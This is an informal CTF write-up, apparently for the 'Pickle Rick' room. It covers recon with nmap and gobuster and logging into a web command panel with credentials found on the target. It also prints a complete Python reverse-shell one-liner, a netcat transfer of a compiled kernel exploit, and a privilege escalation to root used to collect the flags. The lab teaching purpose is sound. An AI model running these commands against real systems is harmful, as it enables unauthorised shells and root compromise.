First thing first we going with recon process doing nmap gobuster,etc... to find out vulnerability of the target machine.
Open the url in browser and we got index page saying morty need help to find three secret ingredients which might be its 3 flag?
https://ibb.co/Stq4fSC
Carefully we inspect element for the index page and we found username in green font!

Nmap and gobuster command that i used in this case:
nmap -sV -sC <IP>
gobuster dir -u <IP> -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,css,html
  
nmap and gobuster result as shown below:
https://ibb.co/dcPn93J - nmap
https://ibb.co/YZLGF0Z - gobuster

Next we gonna open the gobuster result and see the files and dir we found to look for some clue/hint.
robots.txt - we found a string which is useful later we'll save it in txt file.
login.php - we got login which used username we found earlier by viewing source code for index.php page.
clue.txt - saying "Look around the file system for the other ingredient."
Next we go to assets directory but we found some css and js file which when inspected and found nothing in it leading to a flag so we moveon to next step.
https://ibb.co/8x9SV0R - we carefully inspect source for the page but found nothing so we can either brute using hydra but i dont think its gonna be efficient.
We used the username found earlier and password in robots.txt to login "R1ckRul3s:Wubbalubbadubdub"
Succeed to log in and we found a kinda terminal to input command in it but other page cant be visited in this portal.php

now we test the allowed command like ls,cd,whoami,etc to see the respond which is positive.
we can view some files by using ls:
https://ibb.co/XF4XK1F
but we cant use nano,vim,cat to view the this file Sup3rS3cretPickl3Ingred.txt
as this challenge more look alike boot2root machine we gonna upscale our privillege to root user.

So we use "whoami" and got the lowest user then we use "uname -a" to get OS version and here its 
"Linux ip-10-10-41-159 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux"
Go ahead and google or use exploitdb to find exploit for linux with 5.15 version affected and found it.
https://www.exploit-db.com/exploits/50808
https://ibb.co/r0MZ4mz download it and compile it using gcc command.
Next go here to get reverse shell https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
https://ibb.co/D5Q68V8
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
Change the ip and port as you want and setup netcat to listen according to your port "nc -nlvp 1234" 

Go to browser and click 'execute' and we got our connection in terminal.
Now we can use cat to view Sup3rS3cretPickl3Ingred.txt which is our first flag.
But still we cant access more file in root dir so we gonna use the exploit and send it to target machine.
Now open another terminal the same path with our exploit we download just now "gcc 50808.c" 
Go to victim terminal input "cd /tmp" and setup netcat to receive the payload from attacker side.
Victim side use command "nc <attackIP> 4444 > exploit" while attacker side use command "nc -nlvp 4444 < a.out"
https://ibb.co/T8qGy9f - should be like this now we can do ls to make sure file we transfer just now landed 
then use "chmod +x exploit" and "./exploit" to trigger the exploit
Now we can "sudo bash" automatically we got root privillege!
Use "cd" and "ls" you will see "3rd.txt" file and use cat to see and we got the third flag.
Last we find our 2nd flag which at /home/rick and found file named 'second ingredients' we use cat and thats it.

Overall this ctf challenge is fun but its not for beginner its more to intermediate.
